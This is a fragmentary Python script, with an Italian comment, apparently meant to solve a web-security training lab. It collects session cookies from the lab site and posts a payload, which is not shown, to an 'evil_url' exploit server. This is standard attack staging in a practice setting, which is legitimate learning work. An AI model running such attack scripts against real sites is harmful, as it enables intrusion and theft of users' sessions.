...
evil_url = "https://exploit-0a700023037dbda180780c8c01b500cd.exploit-server.net/" 
evil_host = urlparse(evil_url).hostname

url = "https://0ad8009b03b4bddc80520db4007c009c.h1-web-security-academy.net/"
...
session.get(url) # Visita il lab per ottenere i cookie iniziali
...
try:
    response = session.post(evil_url, data=payload)
